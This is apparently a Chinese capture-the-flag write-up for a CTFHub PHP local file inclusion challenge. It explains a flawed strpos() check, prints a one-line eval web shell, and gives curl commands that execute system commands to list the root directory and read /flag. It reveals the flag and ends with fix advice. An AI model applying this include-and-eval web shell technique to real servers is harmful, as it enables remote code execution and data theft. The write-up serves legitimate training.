CTFHub - Web - 文件包含

# CTFHub # Web # 文件包含 # LFI # PHP

一、题目信息

  • 题目名称：文件包含
  • 题目方向：Web - 文件包含
  • 运行环境：PHP 5.6.40
  • 题目目标：利用不安全的 include 执行服务端文件中的 PHP 代码，读取根目录下的 Flag。

二、漏洞分析

访问题目首页，页面通过 highlight_file(__FILE__) 暴露了后端源码：

<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

这里存在两个问题：一是用户可控参数直接传入 include，二是错误地用 strpos() 的返回值判断是否出现关键字。

  • strpos("flag.php", "flag") 返回 0，取反后为 true，检查被绕过。
  • 字符串中不存在 flag 时返回 false，取反后同样为 true。
  • 只有 flag 出现在非首位时才返回正整数，检查才会阻止包含。

首页还提供了 shell.txt，其内容为：

<?php eval($_REQUEST['ctfhub']);?>

include 会按 PHP 语法解析被包含文件，扩展名是否为 .php 不影响代码执行。因此可包含 shell.txt，再通过 ctfhub 参数执行系统命令。

三、解题步骤

  1. 确认代码执行：包含 shell.txt，传入 system('id');。 
    curl.exe -sS --get ^
  --data-urlencode "file=shell.txt" ^
  --data-urlencode "ctfhub=system('id');" ^
  "http://<challenge-host>:10800/"
  2. 定位 Flag：检查根目录文件。 
    curl.exe -sS --get ^
  --data-urlencode "file=shell.txt" ^
  --data-urlencode "ctfhub=system('ls -la /');" ^
  "http://<challenge-host>:10800/"
    -rw-r--r--   1 root root   33 Sep 23 18:46 flag
  3. 读取 Flag：使用 cat 读取 /flag。 
    curl.exe -sS --get ^
  --data-urlencode "file=shell.txt" ^
  --data-urlencode "ctfhub=system('cat /flag');" ^
  "http://<challenge-host>:10800/"
    ctfhub{2b5ef8f1484ce05df7d6ba1a}

四、最终 Flag

ctfhub{2b5ef8f1484ce05df7d6ba1a}

五、修复建议

  • 禁止动态包含用户输入：使用固定映射表将白名单 ID 映射到文件，不直接拼接或接收文件路径。
  • 正确判断字符串位置：若确需检查关键字，应使用 strpos($value, $needle) === false，避免把返回的 0 当作未命中。
  • 移除可执行文件：不要将含 PHP 代码的文件放入 Web 目录；上传目录和临时目录应禁止脚本解析。
  • 缩小权限：Web 服务账户不应读取系统敏感文件，并关闭 allow_url_include 等高风险配置。
